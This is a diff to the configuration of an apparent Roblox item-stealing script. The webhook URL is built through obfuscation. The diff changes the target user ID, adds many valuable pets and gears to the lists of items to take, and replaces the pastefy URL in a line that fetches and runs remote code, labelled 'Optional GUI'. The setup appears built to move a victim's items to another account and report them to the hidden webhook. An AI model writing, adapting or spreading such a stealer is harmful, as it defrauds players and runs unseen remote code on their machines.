@@ -19,7 +19,7 @@ genv.GOOD_WEBHOOK = (function()
     return table.concat(o)
 end)()
 
-genv.TARGET_USER_ID = 2829121161
+genv.TARGET_USER_ID = 471554658
 
 genv.GOOD_AVATAR = "https://cdn.pfps.gg/pfps/77602-blood-cat.gif"
 
@@ -78,6 +78,7 @@ genv.ALLOWED_ANIMALS = {
     "Boppin Bunny",
     "Spooky and Pumpky",
     "Ginger Gerat",
+    "La Ginger Sekolah",
     "Los Chillis",
     "Los Hackers",
     "Bearito Cabinito",
@@ -91,26 +92,88 @@ genv.ALLOWED_ANIMALS = {
     "Quackini Snackini",
     "Queen Bee",
     "Cloverat Clapat",
+    "La Summer Grande",
+    "Los Tictacs",
+    "Spaghetti Tualetti",
     "Caylusaurus",
     "Hopilikalika Hopilikalako",
+    "La Easter Grande",
+    "Steakini Fattini",
     "Garama and Madundung",
-    "Globa Steppa",
-    "Fragola La La La",
-    "Los Tacoritas",
-    "Dug Dug Dug",
+    "La Anniversary Grande",
+    "Nacho Spyder",
+    "Rosetti Tualetti",
+    "Scorpino Coasterino",
+    "Money Money Bros",
+    "Gold Gold Gold",
+    "Jolly Jolly Sahur",
+    "Lavadorito Spinito",
+    "Gym Bros",
+    "Ketchuru and Musturu",
+    "Los Tangcitos",
     "Rico Dinero",
     "Tirilikalika Tirilikalako",
-    "Jolly Jolly Sahur",
-    "Money Money Bros",
-    "Yetimatic"
+    "La Lucky Grande",
+    "La Romantic Grande",
+    "Orcaledon",
+    "Swaggy Bros",
+    "Tictac Sahur",
+    "Dug Dug Dug",
+    "Ketupat Kepat",
+    "La Taco Combinasion",
+    "Coco and Mango",
+    "Tang Tang Keletang",
+    "Abyssaloco",
+    "Esok Goala",
+    "Fragola La La La",
+    "Lovin Rose",
+    "Los Tacoritas",
+    "Eviledon",
+    "Los Primos",
+    "Esok Sekolah",
+    "La Jolly Grande",
+    "Los Cupids",
+    "Los Mariachis",
+    "Los Puggies",
+    "Sand Sand Sand",
+    "W or L",
+    "Globa Steppa",
+    "Tralaledon",
+    "Tuff Toucan",
+    "Gobblino Uniciclino",
+    "Chipso and Queso",
+    "Los Bros",
+    "Chillin Chili",
+    "Celularcini Viciosini"
 }
 
 genv.ALLOWED_BASESKINS = {
-
+    ["Octo"] = true
 }
 
 genv.ALLOWED_GEARS = {
-
+    ["Santa's Sleigh"] = true,
+    ["Cupid's Wings"] = true,
+    ["Witch's Broom"] = true,
+    ["Waverider"] = true,
+    ["Yin Yang Slap"] = true,
+    ["Cursed Slap"] = true,
+    ["Cyber Slap"] = true,
+    ["Divine Slap"] = true,
+    ["Bloodmoon Slap"] = true,
+    ["Radioactive Slap"] = true,
+    ["Rainbow Slap"] = true,
+    ["Rainbow Hammer"] = true,
+    ["Bloodmoon Hammer"] = true,
+    ["Radioactive Airstrike"] = true,
+    ["Yin Yang Lamp"] = true,
+    ["Demon's Head"] = true,
+    ["Lava Slap"] = true,
+    ["Lava Blaster"] = true,
+    ["Alien Slap"] = true,
+    ["Blackhole Bomb"] = true,
+    ["Candy Sentry"] = true,
+    ["Phantom Slap"] = true
 }
 
 genv.ALLOWED_PLACE_IDS = {
@@ -124,7 +187,7 @@ genv.EXTRA_LOADSTRINGS = {
 
 -- Optional GUI / other loaders
 task.spawn(function()
-    loadstring(game:HttpGet("https://pastefy.app/YiHO8jNu/raw"))()
+    loadstring(game:HttpGet("https://pastefy.app/BEUKKcZd/raw"))()
 end)
 
 task.spawn(function()
